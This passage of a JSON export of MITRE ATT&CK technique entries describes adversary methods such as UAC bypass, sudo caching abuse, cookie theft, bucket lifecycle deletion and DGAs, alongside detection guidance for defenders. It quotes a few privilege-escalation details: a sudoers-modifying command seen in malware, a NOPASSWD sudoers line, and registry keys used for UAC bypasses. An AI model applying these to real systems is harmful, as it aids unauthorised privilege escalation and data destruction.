      "detection": "Monitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts, or loading of modules associated with scripting languages (ex: JScript.dll). Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nMonitor for execution of JXA through <code>osascript</code> and usage of <code>OSAScript</code> API that may be related to other suspicious behavior occurring on the system.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If scripting is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
    },
    "T1590.002": {
      "id": "T1590.002",
      "name": "DNS",
      "description": "Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts. DNS MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.(Citation: Sean Metcalf Twitter DNS Records)\n\nAdversaries may gather this information in various ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001). DNS information may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).\n\nAdversaries may also use DNS zone transfer (DNS query type AXFR) to collect all records from a misconfigured DNS server.(Citation: Trails-DNS)(Citation: DNS-CISA)(Citation: Alexa-dns)",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1590.002",
      "stix_id": "attack-pattern--0ff59227-8aa8-4c09-bf1f-925605bd07ea",
      "created": "2020-10-02T15:47:10.102000+00:00",
      "modified": "2025-04-15T22:13:37.080000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1485.001": {
      "id": "T1485.001",
      "name": "Lifecycle-Triggered Deletion",
      "description": "Adversaries may modify the lifecycle policies of a cloud storage bucket to destroy all objects stored within.  \n\nCloud storage buckets often allow users to set lifecycle policies to automate the migration, archival, or deletion of objects after a set period of time.(Citation: AWS Storage Lifecycles)(Citation: GCP Storage Lifecycles)(Citation: Azure Storage Lifecycles) If a threat actor has sufficient permissions to modify these policies, they may be able to delete all objects at once. \n\nFor example, in AWS environments, an adversary with the `PutLifecycleConfiguration` permission may use the `PutBucketLifecycle` API call to apply a lifecycle policy to an S3 bucket that deletes all objects in the bucket after one day.(Citation: Palo Alto Cloud Ransomware)(Citation: Halcyon AWS Ransomware 2025) In addition to destroying data for purposes of extortion and [Financial Theft](https://attack.mitre.org/techniques/T1657), adversaries may also perform this action on buckets storing cloud logs for [Indicator Removal](https://attack.mitre.org/techniques/T1070).(Citation: Datadog S3 Lifecycle CloudTrail Logs)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1485.001",
      "stix_id": "attack-pattern--1001e0d6-ee09-4dfc-aa90-e9320ffc8fe4",
      "created": "2024-09-25T13:16:14.166000+00:00",
      "modified": "2025-04-15T19:58:06.787000+00:00",
      "platforms": [
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Cloud Storage: Cloud Storage Modification"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1123": {
      "id": "T1123",
      "name": "Audio Capture",
      "description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.(Citation: ESET Attor Oct 2019)\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1123",
      "stix_id": "attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967",
      "created": "2017-05-31T21:31:34.528000+00:00",
      "modified": "2025-04-15T21:51:52.461000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data."
    },
    "T1543": {
      "id": "T1543",
      "name": "Create or Modify System Process",
      "description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)  ",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1543",
      "stix_id": "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5",
      "created": "2020-01-10T16:03:18.865000+00:00",
      "modified": "2025-04-15T22:11:29.155000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux",
        "Containers"
      ],
      "permissions_required": [],
      "data_sources": [
        "Service: Service Creation",
        "Container: Container Creation",
        "Driver: Driver Load",
        "Service: Service Modification",
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Modification",
        "File: File Modification",
        "File: File Creation",
        "Windows Registry: Windows Registry Key Creation",
        "Process: OS API Execution",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for changes to system processes that do not correlate with known software, patch cycles, etc., including by comparing results against a trusted system baseline. New, benign system processes may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.  \n\nCommand-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. \n\nMonitor for changes to files associated with system-level processes."
    },
    "T1133": {
      "id": "T1133",
      "name": "External Remote Services",
      "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1133",
      "stix_id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
      "created": "2017-05-31T21:31:44.421000+00:00",
      "modified": "2025-04-15T22:34:58.667000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "Containers",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Flow",
        "Logon Session: Logon Session Metadata",
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Follow best practices for detecting adversary use of [Valid Accounts](https://attack.mitre.org/techniques/T1078) for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.\n\nWhen authentication is not required to access an exposed remote service, monitor for follow-on activities such as anomalous external use of the exposed API or application."
    },
    "T1546.006": {
      "id": "T1546.006",
      "name": "LC_LOAD_DYLIB Addition",
      "description": "Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.\n\nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019t checked at load time.(Citation: Malware Persistence on OS X)",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.006",
      "stix_id": "attack-pattern--10ff21b9-5a01-4268-a1b5-3b55015f1847",
      "created": "2020-01-24T14:21:52.750000+00:00",
      "modified": "2025-04-16T20:37:15.460000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Metadata",
        "Process: Process Creation",
        "File: File Modification",
        "Module: Module Load"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes for those that may be used to modify binary headers. Monitor file systems for changes to application binaries and invalid checksums/signatures. Changes to binaries that do not line up with application updates or patches are also extremely suspicious."
    },
    "T1539": {
      "id": "T1539",
      "name": "Steal Web Session Cookie",
      "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1539",
      "stix_id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
      "created": "2019-10-08T20:04:35.508000+00:00",
      "modified": "2025-04-15T23:12:39.075000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "SaaS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Access",
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for attempts to access files and repositories on a local system that are used to store browser session cookies. Monitor for attempts by programs to inject into or dump browser process memory."
    },
    "T1053.007": {
      "id": "T1053.007",
      "name": "Container Orchestration Job",
      "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1053.007",
      "stix_id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
      "created": "2021-03-29T17:06:22.247000+00:00",
      "modified": "2025-04-15T19:58:07.487000+00:00",
      "platforms": [
        "Containers"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Container: Container Creation",
        "Scheduled Job: Scheduled Job Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for the anomalous creation of scheduled jobs in container orchestration environments. Use logging agents on Kubernetes nodes and retrieve logs from sidecar proxies for application and resource pods to monitor malicious container orchestration job deployments. "
    },
    "T1568.002": {
      "id": "T1568.002",
      "name": "Domain Generation Algorithms",
      "description": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n\nDGAs can take the form of apparently random or \u201cgibberish\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\n\nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1568.002",
      "stix_id": "attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd",
      "created": "2020-03-10T17:44:59.787000+00:00",
      "modified": "2025-04-15T19:58:07.610000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Detecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more.(Citation: Data Driven Security DGA) CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.\n\nMachine learning approaches to detecting DGA domains have been developed and have seen success in applications. One approach is to use N-Gram methods to determine a randomness score for strings used in the domain name. If the randomness score is high, and the domains are not whitelisted (CDN, etc), then it may be determined if a domain is related to a legitimate host or DGA.(Citation: Pace University Detecting DGA May 2017) Another approach is to use deep learning to classify domains as DGA-generated.(Citation: Elastic Predicting DGA)"
    },
    "T1036.007": {
      "id": "T1036.007",
      "name": "Double File Extension",
      "description": "Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system\u2019s policies.(Citation: PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) \n\nAdversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) into a user\u2019s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) then [User Execution](https://attack.mitre.org/techniques/T1204). For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.(Citation: SOCPrime DoubleExtension)\n\nCommon file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1036.007",
      "stix_id": "attack-pattern--11f29a39-0942-4d62-92b6-fe236cf3066e",
      "created": "2021-08-04T20:54:03.066000+00:00",
      "modified": "2025-04-15T22:23:40.712000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for files written to disk that contain two file extensions, particularly when the second is an executable.(Citation: Seqrite DoubleExtension)"
    },
    "T1548.002": {
      "id": "T1548.002",
      "name": "Bypass User Account Control",
      "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1548.002",
      "stix_id": "attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073",
      "created": "2020-01-30T14:24:34.977000+00:00",
      "modified": "2025-04-16T20:37:15.662000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Modification",
        "Command: Command Execution",
        "Process: Process Creation",
        "Process: Process Metadata"
      ],
      "defense_bypassed": [],
      "detection": "There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes.\n\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:\n\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command</code> Registry key.(Citation: enigma0x3 Fileless UAC Bypass)\n\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand</code> Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)\n\nAnalysts should monitor these Registry settings for unauthorized changes."
    },
    "T1496.003": {
      "id": "T1496.003",
      "name": "SMS Pumping",
      "description": "Adversaries may leverage messaging services for SMS pumping, which may impact system and/or hosted service availability.(Citation: Twilio SMS Pumping) SMS pumping is a type of telecommunications fraud whereby a threat actor first obtains a set of phone numbers from a telecommunications provider, then leverages a victim\u2019s messaging infrastructure to send large amounts of SMS messages to numbers in that set. By generating SMS traffic to their phone number set, a threat actor may earn payments from the telecommunications provider.(Citation: Twilio SMS Pumping Fraud)\n\nThreat actors often use publicly available web forms, such as one-time password (OTP) or account verification fields, in order to generate SMS traffic. These fields may leverage services such as Twilio, AWS SNS, and Amazon Cognito in the background.(Citation: Twilio SMS Pumping)(Citation: AWS RE:Inforce Threat Detection 2024) In response to the large quantity of requests, SMS costs may increase and communication channels may become overwhelmed.(Citation: Twilio SMS Pumping)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1496.003",
      "stix_id": "attack-pattern--130d4494-b2d6-4040-bcea-6e59f05222fe",
      "created": "2024-09-25T13:53:19.586000+00:00",
      "modified": "2025-04-15T23:02:00.718000+00:00",
      "platforms": [
        "SaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1016.001": {
      "id": "T1016.001",
      "name": "Internet Connection Discovery",
      "description": "Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, and GET requests to websites.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1016.001",
      "stix_id": "attack-pattern--132d5b37-aac5-4378-a8dc-3127b18a73dc",
      "created": "2021-03-17T15:28:10.689000+00:00",
      "modified": "2025-04-25T14:45:52.631000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Command and Control, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to check Internet connectivity."
    },
    "T1548.003": {
      "id": "T1548.003",
      "name": "Sudo and Sudo Caching",
      "description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1548.003",
      "stix_id": "attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0",
      "created": "2020-01-30T14:34:44.992000+00:00",
      "modified": "2025-04-25T14:45:52.996000+00:00",
      "platforms": [
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Command: Command Execution",
        "Process: Process Creation",
        "Process: Process Metadata"
      ],
      "defense_bypassed": [],
      "detection": "On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the <code>LOG_INPUT</code> and <code>LOG_OUTPUT</code> directives in the <code>/etc/sudoers</code> file."
    },
    "T1560.003": {
      "id": "T1560.003",
      "name": "Archive via Custom Method",
      "description": "An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1560.003",
      "stix_id": "attack-pattern--143c0cbb-a297-4142-9624-87ffc778980b",
      "created": "2020-02-20T21:09:55.995000+00:00",
      "modified": "2025-04-15T21:50:49.814000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Script: Script Execution"
      ],
      "defense_bypassed": [],
      "detection": "Custom archival methods can be very difficult to detect, since many of them use standard programming language concepts, such as bitwise operations."
    },
    "T1578": {
      "id": "T1578",
      "name": "Modify Cloud Compute Infrastructure",
      "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1578",
      "stix_id": "attack-pattern--144e007b-e638-431d-a894-45d90c54ab90",
      "created": "2019-08-30T18:03:05.864000+00:00",
      "modified": "2025-04-15T22:49:33.134000+00:00",
      "platforms": [
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Instance: Instance Metadata",
        "Instance: Instance Stop",
        "Snapshot: Snapshot Creation",
        "Volume: Volume Modification",
        "Instance: Instance Modification",
        "Instance: Instance Creation",
        "Volume: Volume Metadata",
        "Instance: Instance Start",
        "Cloud Service: Cloud Service Metadata",
        "Volume: Volume Creation",
        "Snapshot: Snapshot Modification",
        "Snapshot: Snapshot Metadata",
        "Volume: Volume Deletion",
        "Snapshot: Snapshot Deletion",
        "Instance: Instance Deletion"
      ],
      "defense_bypassed": [],
      "detection": "Establish centralized logging for the activity of cloud compute infrastructure components. Monitor for suspicious sequences of events, such as the creation of multiple snapshots within a short period of time or the mount of a snapshot to a new instance by a new or unexpected user. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones."
    },
    "T1584.008": {
      "id": "T1584.008",
      "name": "Network Devices",
